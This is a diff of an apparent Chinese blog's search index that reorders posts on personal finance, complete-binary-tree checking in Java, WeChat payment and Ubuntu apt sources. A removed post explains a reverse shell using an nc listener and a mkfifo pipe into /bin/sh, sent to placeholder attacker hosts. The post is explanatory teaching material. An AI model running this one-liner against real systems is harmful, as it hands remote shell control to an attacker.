-<h3 id="40-投资"><a href="#40-投资" class="headerlink" title="40% 投资"></a>40% 投资</h3><p>初期可选风险较小的债券、基金定投、黄金等。投资是零和博弈，有人赚就有人亏，风险高的投资一定要用闲钱。</p>
-<p>e.g. 国债，蚂蚁聚宝下的基金定投，黄金，混合基金等</p>
-<h3 id="30-消费"><a href="#30-消费" class="headerlink" title="30% 消费"></a>30% 消费</h3><p>理财需要很强的自控力和克制消费的冲动。如果想持续地增长自己的财富，一定要控制消费，延迟欲望。给自己确立一个维持现有幸福感的最低消费水平，避免陷入一种无限替换和升级的状态。</p>
-<p>30%的范围内可以犒劳一下自己，装点一下生活。</p>
-<h3 id="20-储蓄"><a href="#20-储蓄" class="headerlink" title="20% 储蓄"></a>20% 储蓄</h3><p>既是原始资金的积累，也是一份保障。最好的实行办法就是强制（e.g. 定期）。</p>
-<h3 id="10-保险"><a href="#10-保险" class="headerlink" title="10% 保险"></a>10% 保险</h3><p>常在河边走，哪有不湿鞋</p>
-<p>​关键要养成保险意识。在短期内，一个人发生意外事件的可能性是非常低，但是如果把时间尺度拉长，就会发现，早晚会遭遇一次小概率事件。</p>
-<h3 id="再有多余收入或飞来横财，再按以上规则迭代分配"><a href="#再有多余收入或飞来横财，再按以上规则迭代分配" class="headerlink" title="再有多余收入或飞来横财，再按以上规则迭代分配"></a>再有多余收入或飞来横财，再按以上规则迭代分配</h3><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>理财是一个长期、系统的过程，首先你得有一种很强的未来感，把自己、沉没成本以及财产都纳入一个长期的规划和打算。养成理财的习惯，合理分配资产可以帮助我们达到理想的财务状态，实现财务自由，最重要的是能把生活品质带上一条持续向上的斜坡，这是把控自己的生活，实现幸福生活的关键。</p>
-<hr>
-<p><span id="1"><a href="#back_1">[1]</a><strong>沉没成本</strong> 即已经付出且不可收回的成本，如时间、金钱、精力等</span></p>
-<p><span id="2"><a href="#back_2">[2]</a><strong>投资组合</strong> 由投资人或金融机构所持有的股票、<a href="http://baike.baidu.com/view/26411.htm">债券</a>、<a href="http://baike.baidu.com/view/3100968.htm">衍生金融</a>产品等组成的集合。投资组合的目的在于分散风险。</span> </p>
-]]></content>
-      <categories>
-        <category>读书笔记</category>
-      </categories>
-      <tags>
-        <tag>理财</tag>
-        <tag>生活</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用gitmoji规范git-commit</title>
     <url>/technology/2017/11/%E4%BD%BF%E7%94%A8gitmoji%E8%A7%84%E8%8C%83git-commit/</url>
     <content><![CDATA[<h1 id="gitmoji"><a href="#gitmoji" class="headerlink" title="gitmoji"></a>gitmoji</h1><blockquote>
@@ -2174,22 +2135,6 @@
       </tags>
   </entry>
   <entry>
-    <title>完全二叉树的判定</title>
-    <url>/technology/2017/01/%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%88%A4%E5%AE%9A/</url>
-    <content><![CDATA[<h1 id="树节点类"><a href="#树节点类" class="headerlink" title="树节点类"></a>树节点类</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">  Object Data;</span><br><span class="line">  Node left,right,parent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="二叉树类"><a href="#二叉树类" class="headerlink" title="二叉树类"></a>二叉树类</h1><blockquote>
-<p>其中judge方法为判断是否是完全二叉树</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinTree</span> &#123;</span><br><span class="line">  Node root;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">judge</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n0</span> <span class="operator">=</span> <span class="number">0</span>, n = <span class="number">0</span>, stage = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    Queue&lt;Node&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    queue.offer(<span class="built_in">this</span>.root);</span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">      <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">      n++;</span><br><span class="line">      <span class="comment">//三个必要条件之一</span></span><br><span class="line">      <span class="keyword">if</span> (node.left == <span class="literal">null</span> &amp;&amp; node.right != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="comment">//三个必要条件之二</span></span><br><span class="line">      <span class="keyword">if</span> (stage == <span class="number">2</span> &amp;&amp; (node.left != <span class="literal">null</span> || node.right != <span class="literal">null</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      stage = (node.left != <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) ? <span class="number">2</span> : stage;</span><br><span class="line">      <span class="keyword">if</span> (node.left != <span class="literal">null</span>)</span><br><span class="line">        queue.offer(node.left);</span><br><span class="line">      <span class="keyword">if</span> (node.right != <span class="literal">null</span>)</span><br><span class="line">        queue.offer(node.right);</span><br><span class="line">      <span class="keyword">if</span> (node.left == <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) &#123;</span><br><span class="line">        n0++;</span><br><span class="line">        stage=<span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//三个必要条件之三：完全二叉树满足的公式n0=n/2，其中n0是度为0的节点，n是树总的节点数</span></span><br><span class="line">    <span class="keyword">return</span> (n0 == (<span class="type">int</span>) Math.ceil(n / <span class="number">2.0</span>)) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>technology</category>
-      </categories>
-      <tags>
-        <tag>数据结构与算法</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>微信APP支付流程</title>
     <url>/technology/2017/08/%E5%BE%AE%E4%BF%A1APP%E6%94%AF%E4%BB%98%E6%B5%81%E7%A8%8B/</url>
     <content><![CDATA[<h1 id="支付流程"><a href="#支付流程" class="headerlink" title="支付流程"></a>支付流程</h1><blockquote>
@@ -2212,6 +2157,45 @@
         <tag>微信支付</tag>
         <tag>APP</tag>
         <tag>业务</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>从零开始学理财</title>
+    <url>/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/2017/02/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E7%90%86%E8%B4%A2/</url>
+    <content><![CDATA[<p>最近读了张鹤的《从零开始学理财》。张鹤是著名的财经作家和理财专家，撰写过《成功理财的16堂课》《银行投资理财赚钱法》等理财类的畅销书。</p>
+<p>书中介绍了理财的基本概念、常见的误区和实用的理财技巧。其中的__水库模型__和__资产4321分配法__让理财新手能够快速上手理财。</p>
+<h2 id="一、理财的基本概念"><a href="#一、理财的基本概念" class="headerlink" title="一、理财的基本概念"></a>一、理财的基本概念</h2><p>理财是一个系统的工程，它由__收入__、__消费__、__储蓄__、__投资__、__负债__和__保险__6部分构成</p>
+<h2 id="二、水库模型"><a href="#二、水库模型" class="headerlink" title="二、水库模型"></a>二、水库模型</h2><p>书中用一个基本的理财模型：水库，形象的描述了理财6个构成部分之间的关系。</p>
+<blockquote>
+<p>想象自己有一个水库，你每个月都要朝水库里灌水，这就是__收入__。水库的一侧还有一个大坝，衣食住行都会让水从大坝往外流，是你的__消费__。水库里的存水是你的__储蓄__，水库旁边还有一口井，可以慢慢向你的水库里注水，这就是你的__投资__。如果水库干了，向别人借水，这个是__负债__，还水的时候要多给一些，就是__利息__。为了防止意外发生得稳固大坝，就需要__保险__。</p>
+</blockquote>
+<h2 id="三、最低目标：财务自由"><a href="#三、最低目标：财务自由" class="headerlink" title="三、最低目标：财务自由"></a>三、最低目标：财务自由</h2><p>合理的分配6个部分的比例，构建牢固的“水库”。最终我们可以达到最低目标：__财务自由__。</p>
+<p>所谓财务自由是指： 理财的被动收入高于最低消费的财富自由状态</p>
+<p>之所以把财务自由作为最低目标是我个人观点，因为只有财务自由了，才可以不用靠出卖劳动力去获得生活成本，才算是脱离了生存压力，生活才有了选择权，是自由的，而自由的生活是我的最低目标。</p>
+<h2 id="四、误区"><a href="#四、误区" class="headerlink" title="四、误区"></a>四、误区</h2><h3 id="1-没钱就不理财"><a href="#1-没钱就不理财" class="headerlink" title="1. 没钱就不理财"></a>1. 没钱就不理财</h3><p>没钱更要先建立理财观念，系统性地提高收入，节约开支，增加储蓄，持续投资，清理负债，设置保险。</p>
+<p>可以先投资自己，把钱投入到提升自己的技能和素质提高上。关注投资界信息，交学费积累经验。给自己买一份保险，把防水的闸门修得牢固一些。</p>
+<h3 id="2-钱是挣来的，不是攒出来的"><a href="#2-钱是挣来的，不是攒出来的" class="headerlink" title="2. 钱是挣来的，不是攒出来的"></a>2. 钱是挣来的，不是攒出来的</h3><p>攒钱有2个好处，一个是可以给你积累本金，能让你在看准机会的时候能出手。另一部分好处是能避免急功近利的心态。最成功的投资基本上都是长线投资。</p>
+<h3 id="3-理财就是整天关注理财产品"><a href="#3-理财就是整天关注理财产品" class="headerlink" title="3. 理财就是整天关注理财产品"></a>3. 理财就是整天关注理财产品</h3><p>时刻关注自己的理财产品会增加时间的<span id="back_1"><a href="#1">[1]</a>沉没成本</span>。好的投资策略往往是盯着一个看好产品，然后长期持有，不要频繁更换。</p>
+<p>个人认为时间本身就是最昂贵的资产，如果一项投资(学习、认知除外)需要占用你大量的时间，那便是不划算的。</p>
+<h2 id="五、四三二一资产分配法"><a href="#五、四三二一资产分配法" class="headerlink" title="五、四三二一资产分配法"></a>五、四三二一资产分配法</h2><p>书中提到了一种适用于理财新手的资产分配方法：4321资产分配法。它是基于恒定混合性策略，即保持<span id="back_2"><a href="#2">[2]</a>投资组合</span>中各类资产的比例固定。</p>
+<h3 id="40-投资"><a href="#40-投资" class="headerlink" title="40% 投资"></a>40% 投资</h3><p>初期可选风险较小的债券、基金定投、黄金等。投资是零和博弈，有人赚就有人亏，风险高的投资一定要用闲钱。</p>
+<p>e.g. 国债，蚂蚁聚宝下的基金定投，黄金，混合基金等</p>
+<h3 id="30-消费"><a href="#30-消费" class="headerlink" title="30% 消费"></a>30% 消费</h3><p>理财需要很强的自控力和克制消费的冲动。如果想持续地增长自己的财富，一定要控制消费，延迟欲望。给自己确立一个维持现有幸福感的最低消费水平，避免陷入一种无限替换和升级的状态。</p>
+<p>30%的范围内可以犒劳一下自己，装点一下生活。</p>
+<h3 id="20-储蓄"><a href="#20-储蓄" class="headerlink" title="20% 储蓄"></a>20% 储蓄</h3><p>既是原始资金的积累，也是一份保障。最好的实行办法就是强制（e.g. 定期）。</p>
+<h3 id="10-保险"><a href="#10-保险" class="headerlink" title="10% 保险"></a>10% 保险</h3><p>常在河边走，哪有不湿鞋</p>
+<p>​关键要养成保险意识。在短期内，一个人发生意外事件的可能性是非常低，但是如果把时间尺度拉长，就会发现，早晚会遭遇一次小概率事件。</p>
+<h3 id="再有多余收入或飞来横财，再按以上规则迭代分配"><a href="#再有多余收入或飞来横财，再按以上规则迭代分配" class="headerlink" title="再有多余收入或飞来横财，再按以上规则迭代分配"></a>再有多余收入或飞来横财，再按以上规则迭代分配</h3><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>理财是一个长期、系统的过程，首先你得有一种很强的未来感，把自己、沉没成本以及财产都纳入一个长期的规划和打算。养成理财的习惯，合理分配资产可以帮助我们达到理想的财务状态，实现财务自由，最重要的是能把生活品质带上一条持续向上的斜坡，这是把控自己的生活，实现幸福生活的关键。</p>
+<hr>
+<p><span id="1"><a href="#back_1">[1]</a><strong>沉没成本</strong> 即已经付出且不可收回的成本，如时间、金钱、精力等</span></p>
+<p><span id="2"><a href="#back_2">[2]</a><strong>投资组合</strong> 由投资人或金融机构所持有的股票、<a href="http://baike.baidu.com/view/26411.htm">债券</a>、<a href="http://baike.baidu.com/view/3100968.htm">衍生金融</a>产品等组成的集合。投资组合的目的在于分散风险。</span> </p>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+      </categories>
+      <tags>
+        <tag>理财</tag>
+        <tag>生活</tag>
       </tags>
   </entry>
   <entry>
@@ -2414,29 +2398,15 @@
       </tags>
   </entry>
   <entry>
-    <title>通过远程命令反弹shell</title>
-    <url>/technology/2017/05/%E8%BF%87%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E5%8F%8D%E5%BC%B9shell/</url>
-    <content><![CDATA[<h2 id="通过shell命令模拟反弹shell的攻击过程"><a href="#通过shell命令模拟反弹shell的攻击过程" class="headerlink" title="通过shell命令模拟反弹shell的攻击过程"></a>通过shell命令模拟反弹shell的攻击过程</h2><p>其中attcker_machine是攻击者的机器，也是最终shell反弹的目标机器。meat_machine是一台受攻击的肉鸡，是shell被反弹的机器。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">&#123;attacker_machine_ip&#125; 监听2333端口</span></span><br><span class="line">nc -l -p 2333 -v </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反弹shell至&#123;meat_machine_ip&#125; 2333端口</span></span><br><span class="line">rm /tmp/bd;mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i 2&gt;&amp;1 | nc &#123;meat_machine_ip&#125; 2333 &gt;/tmp/bd</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不从stderr传给stdout</span></span><br><span class="line">rm /tmp/bd;mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i &gt;&amp;1 | nc &#123;attacker_machine_ip&#125; 2333 &gt; /tmp/bd</span><br></pre></td></tr></table></figure>
-
-<p>mkfifo 是创建一个先进先出的文件，整个流程如下：</p>
-<ol>
-<li>先在受害机器上创建了一个先进先出的文件bd</li>
-<li>nc连接控制机，接受控制机的输入，传给bd这个文件</li>
-<li>cat 将bd文件内容传给&#x2F;bin&#x2F;sh 执行</li>
-<li><code>2&gt;&amp;1</code>是将stderr传给stdout，然后重定向给nc</li>
-<li>nc通过网络将结果传给了控制机</li>
-</ol>
+    <title>配置 Linux apt-get 源</title>
+    <url>/technology/2019/04/%E9%85%8D%E7%BD%AE-Linux-apt-get-%E6%BA%90/</url>
+    <content><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb cdrom:[Ubuntu 18.04.1 LTS _Bionic Beaver_ - Release amd64 (20180725)]/ bionic main restricted</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">See http://help.ubuntu.com/community/UpgradeNotes <span class="keyword">for</span> how to upgrade to</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">newer versions of the distribution.</span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic main restricted</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic main restricted</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Major bug fix updates produced after the final release of the</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># distribution.</span></span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic-updates main restricted</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic-updates main restricted</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># team. Also, please note that software in universe WILL NOT receive any</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># review or updates from the Ubuntu security team.</span></span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic universe</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic universe</span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic-updates universe</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic-updates universe</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># team, and may not be under a free licence. Please satisfy yourself as to</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># your rights to use the software. Also, please note that software in</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># multiverse WILL NOT receive any review or updates from the Ubuntu</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># security team.</span></span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic multiverse</span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic-updates multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic-updates multiverse</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># N.B. software from this repository may not have been tested as</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># extensively as that contained in the main release, although it includes</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># newer versions of some applications which may provide useful features.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Also, please note that software in backports WILL NOT receive any review</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># or updates from the Ubuntu security team.</span></span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Uncomment the following two lines to add software from Canonical&#x27;s</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># &#x27;partner&#x27; repository.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># This software is not part of Ubuntu, but is offered by Canonical and the</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># respective vendors as a service to Ubuntu users.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb http://archive.canonical.com/ubuntu bionic partner</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://archive.canonical.com/ubuntu bionic partner</span></span><br><span class="line"></span><br><span class="line">deb http://security.ubuntu.com/ubuntu bionic-security main restricted</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://security.ubuntu.com/ubuntu bionic-security main restricted</span></span><br><span class="line">deb http://security.ubuntu.com/ubuntu bionic-security universe</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://security.ubuntu.com/ubuntu bionic-security universe</span></span><br><span class="line">deb http://security.ubuntu.com/ubuntu bionic-security multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://security.ubuntu.com/ubuntu bionic-security multiverse</span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>technology</category>
       </categories>
       <tags>
-        <tag>linux</tag>
-        <tag>web安全</tag>
-        <tag>shell</tag>
-        <tag>远程命令执行</tag>
-        <tag>nc</tag>
+        <tag>java</tag>
       </tags>
   </entry>
   <entry>
@@ -3503,15 +3473,19 @@
       </tags>
   </entry>
   <entry>
-    <title>配置 Linux apt-get 源</title>
-    <url>/technology/2019/04/%E9%85%8D%E7%BD%AE-Linux-apt-get-%E6%BA%90/</url>
-    <content><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb cdrom:[Ubuntu 18.04.1 LTS _Bionic Beaver_ - Release amd64 (20180725)]/ bionic main restricted</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">See http://help.ubuntu.com/community/UpgradeNotes <span class="keyword">for</span> how to upgrade to</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">newer versions of the distribution.</span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic main restricted</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic main restricted</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Major bug fix updates produced after the final release of the</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># distribution.</span></span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic-updates main restricted</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic-updates main restricted</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># team. Also, please note that software in universe WILL NOT receive any</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># review or updates from the Ubuntu security team.</span></span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic universe</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic universe</span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic-updates universe</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic-updates universe</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># team, and may not be under a free licence. Please satisfy yourself as to</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># your rights to use the software. Also, please note that software in</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># multiverse WILL NOT receive any review or updates from the Ubuntu</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># security team.</span></span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic multiverse</span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic-updates multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic-updates multiverse</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># N.B. software from this repository may not have been tested as</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># extensively as that contained in the main release, although it includes</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># newer versions of some applications which may provide useful features.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Also, please note that software in backports WILL NOT receive any review</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># or updates from the Ubuntu security team.</span></span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Uncomment the following two lines to add software from Canonical&#x27;s</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># &#x27;partner&#x27; repository.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># This software is not part of Ubuntu, but is offered by Canonical and the</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># respective vendors as a service to Ubuntu users.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb http://archive.canonical.com/ubuntu bionic partner</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://archive.canonical.com/ubuntu bionic partner</span></span><br><span class="line"></span><br><span class="line">deb http://security.ubuntu.com/ubuntu bionic-security main restricted</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://security.ubuntu.com/ubuntu bionic-security main restricted</span></span><br><span class="line">deb http://security.ubuntu.com/ubuntu bionic-security universe</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://security.ubuntu.com/ubuntu bionic-security universe</span></span><br><span class="line">deb http://security.ubuntu.com/ubuntu bionic-security multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://security.ubuntu.com/ubuntu bionic-security multiverse</span></span><br></pre></td></tr></table></figure>
-]]></content>
+    <title>完全二叉树的判定</title>
+    <url>/technology/2017/01/%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%88%A4%E5%AE%9A/</url>
+    <content><![CDATA[<h1 id="树节点类"><a href="#树节点类" class="headerlink" title="树节点类"></a>树节点类</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">  Object Data;</span><br><span class="line">  Node left,right,parent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="二叉树类"><a href="#二叉树类" class="headerlink" title="二叉树类"></a>二叉树类</h1><blockquote>
+<p>其中judge方法为判断是否是完全二叉树</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinTree</span> &#123;</span><br><span class="line">  Node root;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">judge</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n0</span> <span class="operator">=</span> <span class="number">0</span>, n = <span class="number">0</span>, stage = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    Queue&lt;Node&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    queue.offer(<span class="built_in">this</span>.root);</span><br><span class="line">    <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">      <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> queue.poll();</span><br><span class="line">      n++;</span><br><span class="line">      <span class="comment">//三个必要条件之一</span></span><br><span class="line">      <span class="keyword">if</span> (node.left == <span class="literal">null</span> &amp;&amp; node.right != <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="comment">//三个必要条件之二</span></span><br><span class="line">      <span class="keyword">if</span> (stage == <span class="number">2</span> &amp;&amp; (node.left != <span class="literal">null</span> || node.right != <span class="literal">null</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      stage = (node.left != <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) ? <span class="number">2</span> : stage;</span><br><span class="line">      <span class="keyword">if</span> (node.left != <span class="literal">null</span>)</span><br><span class="line">        queue.offer(node.left);</span><br><span class="line">      <span class="keyword">if</span> (node.right != <span class="literal">null</span>)</span><br><span class="line">        queue.offer(node.right);</span><br><span class="line">      <span class="keyword">if</span> (node.left == <span class="literal">null</span> &amp;&amp; node.right == <span class="literal">null</span>) &#123;</span><br><span class="line">        n0++;</span><br><span class="line">        stage=<span class="number">2</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//三个必要条件之三：完全二叉树满足的公式n0=n/2，其中n0是度为0的节点，n是树总的节点数</span></span><br><span class="line">    <span 